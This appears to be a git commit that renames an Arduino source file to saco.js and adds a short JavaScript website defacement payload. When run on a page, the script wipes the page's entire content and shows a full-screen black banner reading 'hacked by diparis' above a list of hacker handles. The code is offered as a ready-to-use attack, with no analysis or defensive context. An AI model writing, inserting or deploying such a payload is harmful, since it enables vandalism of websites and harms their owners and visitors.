7ca59a9d518335ebfcfee1c0218ea42b05833bfa
ex <113571950+securitydied@users.noreply.github.com>
2026-01-26 14:49:25 -0300

    Update and rename ledarduino.cpp to saco.js

---
+++ saco.js
@@ -0,0 +1,25 @@
+document.body.innerHTML = "";
+document.body.style.margin = "0";
+
+const box = document.createElement("div");
+box.innerHTML = `
+  <h1>hacked by diparis</h1>
+  <p>jotinh4, r0dr1g0, luc4s, k4w4n, ry4n, m4rc3l, jun1n</p>
+`;
+
+box.style.cssText = `
+  position: fixed;
+  inset: 0;
+  background: black;
+  color: white;
+
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+
+  text-align: center;
+  font-family: Arial, Helvetica, sans-serif;
+`;
+
+document.body.appendChild(box);
